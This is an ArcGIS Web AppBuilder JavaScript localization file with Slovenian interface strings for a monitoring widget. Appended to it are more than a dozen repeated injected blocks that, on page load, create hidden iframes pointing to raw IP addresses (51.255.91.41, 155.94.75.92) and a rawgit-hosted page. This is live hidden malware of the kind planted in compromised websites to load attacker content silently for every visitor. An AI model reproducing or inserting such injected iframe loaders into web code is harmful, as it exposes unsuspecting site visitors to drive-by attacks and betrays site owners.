// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/nls/strings":{_widgetLabel:"Monitoring",geometryServicesNotFound:"Geometrijska storitev ni na voljo.",unableToDrawBuffer:"Obrisa ni mogo\u010de izrisati. Poskusite znova.",invalidConfiguration:"Neveljavna konfiguracija.",clearAOIButtonLabel:"Za\u010dni znova",noGraphicsShapefile:"Nalo\u017eeni shapefile ne vsebuje grafike.",zoomToLocationTooltipText:"Pribli\u017eaj lokacijo",noGraphicsToZoomMessage:"Ni najdenih grafik za pribli\u017eati.",placenameWidget:{placenameLabel:"Iskanje lokacije"},
drawToolWidget:{useDrawToolForAOILabel:"Izberite na\u010din risanja",toggleSelectability:"Kliknite za preklop izbirnosti",chooseLayerTitle:"Izberite izbirljiv sloj",selectAllLayersText:"Izberi vse",layerSelectionWarningTooltip:"Za ustvarjanje interesnega obmo\u010dja (AOI) mora biti izbran vsaj en sloj"},shapefileWidget:{shapefileLabel:"Nalo\u017eite stisnjeno shapefile",uploadShapefileButtonText:"Nalo\u017ei",unableToUploadShapefileMessage:"Shapefile ni mogo\u010de nalo\u017eiti"},coordinatesWidget:{selectStartPointFromSearchText:"Dolo\u010dite za\u010detno to\u010dko",
addButtonTitle:"Dodaj",deleteButtonTitle:"Odstrani",mapTooltipForStartPoint:"Kliknite na karto za dolo\u010ditev za\u010detne to\u010dke",mapTooltipForUpdateStartPoint:"Kliknite na karto za posodobitev za\u010detne to\u010dke",locateText:"Lociraj",locateByMapClickText:"Izberi za\u010detne koordinate",enterBearingAndDistanceLabel:"Vnesite smerni kot in razdaljo od za\u010detke to\u010dke",bearingTitle:"Smerni kot",distanceTitle:"Razdalja",planSettingTooltip:"Nastavitve na\u010drta",invalidLatLongMessage:"Vnesite veljavne vrednosti."},
bufferDistanceAndUnit:{bufferInputTitle:"Razdalja obrisa (izbirno)",bufferInputLabel:"Poka\u017ei rezultate znotraj"},traverseSettings:{bearingLabel:"Smerni kot",lengthLabel:"Dol\u017eina",addButtonTitle:"Dodaj",deleteButtonTitle:"Odstrani"},planSettings:{expandGridTooltipText:"Raz\u0161iri mre\u017eo",collapseGridTooltipText:"Strni mre\u017eo",directionUnitLabelText:"Enota navodil za pot",distanceUnitLabelText:"Razdalja in enote dol\u017eine",planSettingsComingSoonText:"Kmalu na voljo"},newTraverse:{invalidBearingMessage:"Neveljaven smerni kot.",
invalidLengthMessage:"Neveljavna dol\u017eina.",negativeLengthMessage:"Negativna dol\u017eina"},reportsTab:{aoiAreaText:"Interesno obmo\u010dje (AOI)",downloadButtonTooltip:"Prenesi",printButtonTooltip:"Natisni",uploadShapefileForAnalysisText:"Nalo\u017eite shapefile za vklju\u010ditev v analizo",uploadShapefileForButtonText:"Prebrskaj",downloadLabelText:"Izberi obliko:",downloadBtnText:"Prenesi",noDetailsAvailableText:"Ni najdenih rezultatov",featureCountText:"\u0160tevec",featureAreaText:"Obmo\u010dje",
featureLengthText:"Dol\u017eina",attributeChooserTooltip:"Izberite atribute za prikaz",csv:"CSV",filegdb:"File Geodatabase",shapefile:"Shapefile",noFeaturesFound:"Za izbrano obliko datoteke rezultati niso najdeni",selectReportFieldTitle:"Izberite polja",noFieldsSelected:"Polja niso izbrana",intersectingFeatureExceedsMsgOnCompletion:"Za enega ali ve\u010d slojev je bilo dose\u017eeno najve\u010dje \u0161tevilo zapisov.",unableToAnalyzeText:"Dose\u017eeno je bilo najve\u010dje \u0161tevilo zapisov, analiza ni mogo\u010da.",
errorInPrintingReport:"Poro\u010dila ni mogo\u010de natisniti. Preverite, ali so nastavitve poro\u010dila veljavne.",aoiInformationTitle:"Informacija o interesnem obmo\u010dju (AOI)",summaryReportTitle:"Povzetek",notApplicableText:"Ni na voljo",downloadReportConfirmTitle:"Potrdi prenos",downloadReportConfirmMessage:"Ste prepri\u010dani, da \u017eelite prenesti?",noDataText:"Ni podatkov",createReplicaFailedMessage:"Prenos slede\u010dih slojev \x3cbr/\x3e ${layerNames} ni uspel",extractDataTaskFailedMessage:"Prenos ni uspel",
printLayoutLabelText:"Postavitev",printBtnText:"Natisni",printDialogHint:"Opomba: Naslov poro\u010dila in komentarje je mogo\u010de urejati v predogledu poro\u010dila.",unableToDownloadFileGDBText:"File Geodatabase ni mogo\u010de prenesti za interesno obmo\u010dje (AOI), ki vsebuje to\u010dkovne in linijske lokacije",unableToDownloadShapefileText:"Shapefile ni mogo\u010de prenesti za interesno obmo\u010dje (AOI), ki vsebuje to\u010dkovne in linijske lokacije",analysisUnitLabelText:"Poka\u017ei rezultate znotraj:",
analysisUnitButtonTooltip:"Izberite enote za analizo",analysisCloseBtnText:"Zapri",feetUnit:"\u010cevlji/Kvadratni \u010devlji",milesUnit:"Milje/Akri",metersUnit:"Metri/Kvadratni metri",kilometersUnit:"Kilometri/Kvadratni kilometri",hectaresUnit:"Kilometri/Hektarji",hectaresAbbr:"hektarji",layerNotVisibleText:"Analiza ni mogo\u010da, sloj je izklopljen ali je zunaj merila razpona vidnosti.",refreshBtnTooltip:"Osve\u017ei poro\u010dilo"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});